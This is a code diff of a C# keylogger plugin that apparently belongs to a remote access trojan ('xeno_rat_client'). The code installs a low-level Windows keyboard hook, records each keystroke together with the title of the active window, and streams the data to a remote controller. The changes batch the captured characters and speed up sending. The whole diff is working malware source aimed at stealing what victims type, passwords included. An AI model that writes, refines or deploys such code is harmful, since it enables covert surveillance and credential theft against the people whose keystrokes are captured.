@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Linq;
@@ -34,32 +35,34 @@ namespace Plugin
         Node node;
 
 
-        List<string[]> SendQueue = new List<string[]>();
-
+        List<string> SendQueue = new List<string>();
         public async Task Run(Node node)
         {
             await node.SendAsync(new byte[] { 3 });//indicate that it has connected
             
             this.node = node;
             IntPtr hookHandle=IntPtr.Zero;
-            new Thread(() =>
-            {
-                HookCallbackDelegate hcDelegate = HookCallback;
-                Process currproc = Process.GetCurrentProcess();
-                string mainModuleName = currproc.MainModule.ModuleName;
-                currproc.Dispose();
+            HookCallbackDelegate hcDelegate = HookCallback;
+            Process currproc = Process.GetCurrentProcess();
+            string mainModuleName = currproc.MainModule.ModuleName;
+            currproc.Dispose();
+            new Thread(() => {
                 hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, hcDelegate, GetModuleHandle(mainModuleName), 0);
-                Application.Run();
+                if (!Application.MessageLoop)
+                {
+                    Application.Run();
+                }
             }).Start();
             while (node.Connected())
             {
-                if (SendQueue.Count > 0) 
+                if (SendQueue.Count > 0)
                 {
-                    if (SendQueue[0].Length != 2) continue;
-                    await sendKeyData(SendQueue[0][0], SendQueue[0][1]);
-                    SendQueue.RemoveAt(0);
+                    string activeWindow = (await Utils.GetCaptionOfActiveWindowAsync()).Replace("*","");
+                    string chars = string.Join("", SendQueue);
+                    SendQueue.Clear();
+                    await sendKeyData(activeWindow, chars);
                 }
-                await Task.Delay(10);
+                await Task.Delay(1);
             }
             if (hookHandle != IntPtr.Zero) 
             {
@@ -70,7 +73,6 @@ namespace Plugin
 
         public async Task sendKeyData(string open_application, string charectar) 
         {
-            
             if (node == null || !node.Connected()) return;
             await node.SendAsync(Encoding.UTF8.GetBytes(open_application));
             await node.SendAsync(Encoding.UTF8.GetBytes(charectar));
@@ -85,11 +87,9 @@ namespace Plugin
                 string character = GetCharacterFromKey((uint)vkCode, isShiftPressed);
                 if ((((ushort)GetKeyState(0x14)) & 0xffff) != 0)//check for caps lock
                 {
-                    character= character.ToUpper();
+                    character = character.ToUpper();
                 }
-                string open_application = xeno_rat_client.Utils.GetCaptionOfActiveWindow().Replace("*", "");
-                string[] sendData = new string[] { open_application, character };
-                SendQueue.Add(sendData);
+                SendQueue.Add(character);
             }
             return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
         }
